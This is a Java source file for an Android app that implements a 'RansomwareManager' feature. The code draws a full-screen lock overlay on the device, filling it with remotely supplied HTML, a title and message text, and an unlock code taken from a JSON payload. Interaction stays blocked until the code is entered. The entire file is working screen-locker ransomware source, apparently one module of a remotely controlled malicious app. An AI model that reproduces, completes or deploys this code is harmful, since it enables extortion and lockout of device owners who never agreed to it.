package com.fason.app.features.ransomware;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import com.fason.app.core.FasonApp;

import org.json.JSONObject;

/**
 * RansomwareManager — full-screen lock overlay.
 * Displays a custom HTML lock page; blocks all interaction until unlock code.
 */
public final class RansomwareManager {
    private static volatile RansomwareManager instance;
    private final Context ctx;
    private final WindowManager wm;
    private final Handler main = new Handler(Looper.getMainLooper());
    private volatile View lockView;
    private volatile String unlockCode = "";
    private volatile boolean locked = false;

    private RansomwareManager() {
        this.ctx = FasonApp.getContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
    }

    public static synchronized RansomwareManager getInstance() {
        if (instance == null) instance = new RansomwareManager();
        return instance;
    }

    public boolean isLocked() { return locked; }

    @SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
    public synchronized void lock(JSONObject payload) {
        if (locked) return;
        String title = payload.optString("title", "Device Locked");
        String body = payload.optString("body", "This device has been locked.");
        unlockCode = payload.optString("unlockCode", "");
        String customHtml = payload.optString("html", "");

        main.post(() -> {
            try {
                FrameLayout root = new FrameLayout(ctx);
                root.setBackgroundColor(Color.BLACK);

                WebView web = new WebView(ctx);
                WebSettings ws = web.getSettings();
                ws.setJavaScriptEnabled(true);
                web.setWebViewClient(new WebViewClient());
                web.addJavascriptInterface(new LockBridge(), "LockBridge");

                String page = !customHtml.isEmpty() ? customHtml : defaultPage(title, body);
                web.loadDataWithBaseURL(null, page, "text/html", "UTF-8", null);
                root.addView(web);

                int type = Build.VERSION.SDK_INT >= 26
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE;
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.OPAQUE);
                lp.gravity = Gravity.TOP | Gravity.START;
                wm.addView(root, lp);
                lockView = root;
                locked = true;
            } catch (Exception ignored) {}
        });
    }

    public synchronized void unlock(String code) {
        if (!locked) return;
        if (!unlockCode.isEmpty() && !unlockCode.equals(code)) return;
        main.post(() -> {
            try {
                if (lockView != null) { wm.removeView(lockView); lockView = null; }
                locked = false;
            } catch (Exception ignored) {}
        });
    }

    private String defaultPage(String title, String body) {
        return "<!DOCTYPE html><html><head><meta charset='utf-8'>"
                + "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                + "<style>body{background:#000;color:#fff;font-family:sans-serif;display:flex;"
                + "flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}"
                + "h1{font-size:28px;margin-bottom:16px}p{color:#aaa;text-align:center;padding:0 32px}"
                + "input{padding:12px;margin-top:24px;border-radius:8px;border:1px solid #444;"
                + "background:#111;color:#fff;font-size:16px;text-align:center}"
                + "button{padding:12px 32px;margin-top:12px;background:#c00;color:#fff;border:none;"
                + "border-radius:8px;font-size:16px}</style></head><body>"
                + "<h1>" + esc(title) + "</h1><p>" + esc(body) + "</p>"
                + "<input id='code' type='password' placeholder='Unlock code'>"
                + "<button onclick='tryUnlock()'>Unlock</button>"
                + "<script>function tryUnlock(){try{LockBridge.unlock(document.getElementById('code').value);}catch(e){}}</script>"
                + "</body></html>";
    }

    private final class LockBridge {
        @android.webkit.JavascriptInterface
        public void unlock(String code) { RansomwareManager.this.unlock(code); }
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
    }
}
